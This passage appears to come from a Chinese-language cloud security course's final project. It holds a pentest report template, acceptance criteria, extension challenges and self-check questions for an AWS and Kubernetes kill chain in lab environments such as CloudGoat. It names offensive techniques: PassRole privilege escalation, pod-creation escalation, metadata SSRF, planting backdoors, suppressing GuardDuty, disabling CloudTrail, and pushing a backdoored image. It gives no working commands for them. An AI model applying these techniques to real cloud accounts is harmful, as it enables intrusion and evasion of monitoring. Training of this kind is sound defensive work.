[描述如何取得初始憑證：GitHub 洩漏 / 公開 S3 / 其他]

### 3.2 提權路徑

[描述 IAM 提權鏈，引用 Finding ID]

### 3.3 橫向移動

[描述從 AWS 到 K8s 的橫向路徑]

### 3.4 持久化

[描述後門植入手法]

### 3.5 資料存取

[描述能存取哪些敏感資料]

---

## 4. Findings 詳情

### F-001：[Finding 標題]

**Severity**：Critical / High / Medium / Low / Informational
**CVSS 3.1 Score**：[分數]（[向量]）
**MITRE ATT&CK**：[Technique ID] — [Technique Name]

**描述**：
[一段描述這個問題是什麼、為什麼危險]

**重現步驟**：
```bash
[具體指令]
```

**影響**：
[如果被真實攻擊者利用，後果是什麼]

**修補建議**：
[具體的修補步驟，包含指令或設定範例]

**參考資料**：
- [連結 1]
- [連結 2]

---

（以下重複 F-002 到 F-N 的格式）

---

## 5. 偵測能力評估

### 5.1 被偵測到的行為

| 行動 | 偵測工具 | Finding 類型 | 回應時間 |
|---|---|---|---|
| [行動描述] | GuardDuty | [Finding Type] | [分鐘] |
| [行動描述] | Falco | [Rule Name] | [秒] |

### 5.2 偵測盲點（Detection Gap）

| 行動 | 應偵測但未偵測到 | 建議補強 |
|---|---|---|
| [行動描述] | CloudTrail 無覆蓋 | 開啟 multi-region trail |
| [行動描述] | 無 K8s audit log | 啟用 EKS audit logs |

---

## 6. 修補路線圖

| 優先級 | Finding ID | 建議行動 | 負責團隊 | 預計完成 |
|---|---|---|---|---|
| P0（立即） | F-001, F-002 | [行動] | 雲端團隊 | 2 週內 |
| P1（30 天） | F-003, F-004 | [行動] | DevOps | 30 天 |
| P2（60 天） | F-005, F-006 | [行動] | 資安團隊 | 60 天 |
| P3（90 天） | F-007, F-008 | [行動] | [團隊] | 90 天 |

---

## 7. 附錄

### A. 工具列表

| 工具 | 版本 | 用途 |
|---|---|---|
| Pacu | [version] | AWS 攻擊框架 |
| ScoutSuite | [version] | 設定掃描 |
| enumerate-iam | [commit] | 權限枚舉 |
| kubectl | [version] | K8s 操作 |
| Falco | [version] | K8s runtime 偵測 |

### B. 測試帳號清理確認

本次評估建立的所有測試資源已於 [日期] 完全清除：
- [ ] Shadow IAM user 已刪除
- [ ] 測試 Lambda function 已刪除
- [ ] escape-pod 已刪除
- [ ] ClusterRoleBinding 後門已刪除
- [ ] GuardDuty suppression rule 已刪除
- [ ] CloudTrail 已重新啟用

### C. 參考資料

- [MITRE ATT&CK for Cloud](https://attack.mitre.org/matrices/enterprise/cloud/)
- [CIS Amazon Web Services Foundations Benchmark](https://www.cisecurity.org/benchmark/amazon_web_services)
- [Kubernetes Security Checklist](https://kubernetes.io/docs/concepts/security/security-checklist/)
- [AWS Security Best Practices](https://docs.aws.amazon.com/security/)
```

</details>

---

## 驗收標準

完成本 final project 的要求：

- [ ] **Kill chain 走完**：從初始低權限憑證出發，能在 lab 環境裡跑完 [1] 到 [7] 的每個步驟，並記錄每步的實際指令輸出（截圖或 log 均可）
- [ ] **找出至少 3 個 Critical finding**：在 CloudGoat 或自建 lab 裡真實找到、能重現的 Critical 等級問題，每個都有 CVSS score 和 MITRE technique ID
- [ ] **寫出 Executive Summary**：一段 150 字以內、給非技術人員看的風險摘要，不能出現 SSRF、IAM、RBAC 等術語（或必須括號解釋）
- [ ] **被 GuardDuty 抓到至少 1 個 finding**：開著 GuardDuty 做攻擊，截圖至少一個 finding，並在報告裡說明它抓到了你什麼動作
- [ ] **每個 Critical finding 都有可執行的修補建議**：不是「建議加強權限管控」這種廢話，是具體到有指令或設定值的建議，對應本課 Part 7 的防禦章節

---

## 延伸挑戰

完成基本 kill chain 後，挑戰更難的場景：

**挑戰一：混合雲（Azure + AWS）攻擊路徑**

在 AWS 攻擊完後，找到 Secrets Manager 裡藏著 Azure Service Principal 的憑證，橫跳到 Azure 訂閱。對應 Ch 38。需要 Azure 帳號（免費試用就夠）。

**挑戰二：OIDC CI/CD 信任濫用**

在 CloudGoat 的 `codebuild_secrets` 場景基礎上，擴展成：GitHub Actions workflow 透過 OIDC 取得 AWS 短期 token，然後找出 IAM role 的 trust policy 寫太寬（`Condition` 沒有鎖 sub），讓任何 GitHub repo 都能 assume 它。對應 Ch 31。

**挑戰三：Image 供應鏈投毒**

在 kube-goat 環境裡，模擬一個 malicious image 被推進 ECR 的場景：建一個含後門的 Docker image，推上 ECR，然後讓一個沒有 image 驗簽的 deployment 拉到它。再用 Kyverno 寫 policy 擋掉沒有 cosign 簽名的 image。對應 Ch 19、Ch 32。

**挑戰四：完整 CKS 試題練習**

把 CKS（Certified Kubernetes Security Specialist）的官方 curriculum 拿來對照本課，每個考點在 kube-goat 或 minikube 裡實際做一遍：NetworkPolicy 隔離、RBAC 最小權限、Pod Security Admission、image 掃描、Audit log 分析、Runtime security（Falco）。這個挑戰完成等於 CKS 考前實戰準備。

---

## 自我檢核

完成後確認能清楚回答以下問題：

1. **PassRole 提權**：為什麼一個只有 `iam:PassRole` + `lambda:CreateFunction` 的 IAM user，能在沒有 `iam:AttachRolePolicy` 的情況下取得 admin 權限？這個攻擊路徑的限制是什麼（什麼條件下它不可行）？

2. **IMDSv1 vs IMDSv2**：IMDSv2 需要先發 PUT 請求取 token 再用 token 打 GET，為什麼這樣能防住 SSRF？什麼類型的 SSRF 仍然能繞過 IMDSv2？

3. **K8s RBAC 提權**：`create pods` 這個 verb 為什麼能導致 cluster-admin 提權？需要搭配哪些其他條件（hint：查 Ch 27 的 hostPath + privileged）？

4. **偵測能力**：在你的 lab 裡，哪些動作被 GuardDuty 抓到、哪些沒有？GuardDuty 的盲點是什麼（它看不到哪一層的行為）？

5. **縱深防禦**：如果你是這家公司的 CISO，你只有 30 天和 2 個工程師的工時，你會優先修哪 3 個 finding？你的判斷依據是什麼（可利用性、影響範圍、修補成本）？

---

## 讀完之後

如果你走到這裡，你已經能對一個雲環境做完整 kill chain 了。接下來的路：

**繼續打靶**：CloudGoat 所有 scenario 全部打完（共 14 個），重點在 `detection_evasion`、`rce_web_app`、`cloud_breach_s3`。文件在 [cloudgoat.readthedocs.io](https://cloudgoat.readthedocs.io/)。

**考證**：CKS 和 AWS Security Specialty 是最接近本課內容的兩張認證。本課涵蓋 CKS 考綱的約 80%、AWS Security Specialty 的約 60%（那 40% 是 AWS 原生安全服務的設定細節，Udemy 課補）。CKS 考試是 killer.sh 模擬器 + 真實 cluster，比 CKA 難很多。

**Bug Bounty 的雲端範圍**：HackerOne 和 Bugcrowd 上有大量含 AWS 資源範圍的 program。找法：在 Bugcrowd 的 scope 篩選器用 `amazonaws.com`、`s3.amazonaws.com` 搜尋；在 HackerOne 用 `asset_type=URL` 加 `aws` 關鍵字。AWS 範圍的 bounty 通常要求你找到真實 data exposure（不是只有 misconfig）才算 valid finding。

**讀真實紅隊報告**：

- [Rhino Security Labs 研究部落格](https://rhinosecuritylabs.com/blog/)：Pacu 作者寫的 AWS 攻擊研究，本課 IAM 提權的很多路徑來自這裡
- [NCC Group 公開研究](https://research.nccgroup.com/)：有 K8s 和容器逃逸的一手分析
- [SpecterOps — BloodHound for AWS（Bloodhound Enterprise 的雲端版）](https://specterops.io/)：視覺化 IAM 提權圖的工具，比 enumerate-iam 更直觀
- Mandiant、CrowdStrike 和 Wiz 都有年度雲端威脅報告，用真實 incident 說明攻擊路徑——從防禦方的角度補完你的攻擊視角
